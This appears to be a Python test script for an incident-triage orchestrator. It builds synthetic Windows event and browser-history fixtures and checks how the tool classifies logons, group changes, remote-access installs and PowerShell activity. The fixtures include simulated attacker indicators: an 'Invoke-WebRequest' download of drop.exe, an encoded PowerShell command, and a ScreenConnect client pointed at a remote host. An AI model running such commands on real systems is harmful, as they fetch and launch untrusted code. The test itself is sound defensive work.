"""Verify folder-only discovery, access attribution, boundary citations and RMM extraction."""
import argparse
import csv
import json
import subprocess
import sys
import tempfile
from pathlib import Path


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--skills-root', required=True, type=Path)
    root = parser.parse_args().skills_root.resolve()
    script = root / 'investigation-orchestrator/scripts/investigate.py'
    with tempfile.TemporaryDirectory(prefix='incident-triage-') as temp:
        work = Path(temp)
        kape, browser = work / 'parse', work / 'browser'
        kape.mkdir()
        browser.mkdir()
        def named(**values):
            return json.dumps({'EventData': {'Data': [{'@Name': k, '#text': v} for k, v in values.items()]}})
        with (kape / 'events.csv').open('w', encoding='utf-8', newline='') as stream:
            writer = csv.writer(stream)
            writer.writerow(['EventId', 'TimeCreated', 'Provider', 'Channel', 'Computer', 'Payload'])
            # Deliberately out of order: boundary citations must track actual earliest/latest time.
            for minute in (9, 1, 5):
                writer.writerow(['4624', f'2026-10-14 20:{minute:02}:00', 'Microsoft-Windows-Security-Auditing', 'Security', 'pc', named(TargetUserName='alice', LogonType='3', IpAddress='10.0.0.5')])
            writer.writerow(['4624', '2026-10-14 21:00:00', 'Microsoft-Windows-Security-Auditing', 'Security', 'pc', named(TargetUserName='alice', LogonType='10', IpAddress='203.0.113.5')])
            writer.writerow(['4732', '2026-10-14 21:01:00', 'Microsoft-Windows-Security-Auditing', 'Security', 'pc', named(TargetUserName='Administrators', MemberSid='S-1-5-21-123')])
            writer.writerow(['7045', '2026-10-14 21:02:00', 'Service Control Manager', 'System', 'pc', 'ScreenConnect.ClientService.exe ?h=remote.example.org&p=443&k=TOPSECRET'])
            writer.writerow(['100', '2026-10-14 21:03:00', 'ScreenConnect', 'Application', 'pc', 'Session connected; Relay Server: relay://instance-test-relay.screenconnect.com:443/'])
            writer.writerow(['4104', '2026-10-14 21:04:00', 'Microsoft-Windows-PowerShell', 'PowerShell', 'pc', 'Invoke-WebRequest https://example.org/drop.exe'])
            writer.writerow(['4688', '2026-10-14 21:05:00', 'Microsoft-Windows-Security-Auditing', 'Security', 'pc', named(NewProcessName='powershell.exe', CommandLine='powershell -EncodedCommand ZQBjAGgAbwA=')])
            # A matching ID from an unrelated provider is not a security logon.
            writer.writerow(['4624', '2026-10-14 19:00:00', 'Unrelated', 'Application', 'pc', 'ordinary event'])
        (browser / 'history.jsonl').write_text('\n'.join(json.dumps(row) for row in [
            dict(datetime='2026-10-14T20:59:00Z', data_type='chrome:downloads:download', url='https://example.org/drop.exe', target_path='C:\\Users\\alice\\Downloads\\drop.exe'),
            dict(datetime='2026-10-14T19:00:00Z', data_type='chrome:history:page_visited', url='https://ordinary.example.org/')]) + '\n', encoding='utf-8')
        command = [sys.executable, str(script), '--case', 'check', '--source', f'kape={kape}', '--source', f'hindsight={browser}', '--output-root', str(work / 'output')]
        def run(extra=()):
            result = subprocess.run(command + list(extra), capture_output=True, text=True, timeout=60)
            assert result.returncode == 0, result.stdout + result.stderr
            return json.loads(result.stdout)
        run()
        case = work / 'output/check'
        brief = json.loads((case / 'case-brief.json').read_text(encoding='utf-8'))
        assert brief['references'] and 'kape' in brief['sources']
        categories = json.loads((case / 'kape/round-0001/triage-summary.json').read_text(encoding='utf-8'))['categories']
        assert {'logon-success', 'remote-interactive-logon', 'group-membership-added', 'service-installed', 'rmm', 'powershell-review'} <= categories.keys()
        logon = categories['logon-success'][0]
        assert logon['count'] == 3
        assert logon['first_utc'].startswith('2026-10-14T20:01:00')
        assert logon['evidence'][0]['record'] == '3'
        assert categories['group-membership-added'][0]['evidence'][0]['details']['MemberSid'] == 'S-1-5-21-123'
        events = [json.loads(line) for line in (case / 'timeline.jsonl').read_text(encoding='utf-8').splitlines()]
        assert len(events) == 7, len(events)
        assert all(e['timestamp_utc'] for e in events)
        assert not any('logon-success' in e.get('triage_categories', []) for e in events)
        assert events[0]['orchestrator'] == 'hindsight'
        groups = [json.loads(line) for line in (case / 'kape/round-0001/triage-groups.jsonl').read_text(encoding='utf-8').splitlines()]
        domains = [d for g in groups if g['category'] == 'rmm' for s in g['samples'] for d in s['details']['domains']]
        assert any(d['value'] == 'remote.example.org' and 'high-review' in d['screenconnect_triage'] for d in domains)
        assert any(d['value'].endswith('.screenconnect.com') and 'medium-review' in d['screenconnect_triage'] for d in domains)
        assert 'TOPSECRET' not in json.dumps(brief)
        assert 'Incident triage' in (case / 'dashboard.html').read_text(encoding='utf-8')
        before = (case / 'timeline.jsonl').read_bytes()
        repeated = run()
        assert (case / 'timeline.jsonl').read_bytes() == before
        assert all(s.get('skipped') for s in repeated['sources'])
        # Targeted searches remain available without discovery.
        targeted = subprocess.run(command + ['--case', 'targeted', '--leads-only', '--lead', 'TOPSECRET'], capture_output=True, text=True, timeout=60)
        assert targeted.returncode == 0, targeted.stderr
        assert not (work / 'output/targeted/case-brief.json').exists()
        with (browser / 'history.jsonl').open('a', encoding='utf-8') as stream:
            stream.write('{malformed\n')
        failed = subprocess.run(command + ['--rescan'], capture_output=True, text=True, timeout=60)
        assert failed.returncode == 2
        retry = subprocess.run(command, capture_output=True, text=True, timeout=60)
        assert retry.returncode == 2
        assert not next(s for s in json.loads(retry.stdout)['sources'] if s['orchestrator'] == 'hindsight').get('skipped')
    print('PASS: no-lead discovery, grouped baseline, remote access and membership, exact earliest citation, RMM hosting extraction/redaction, dashboard, cache and targeted mode')


if __name__ == '__main__':
    main()
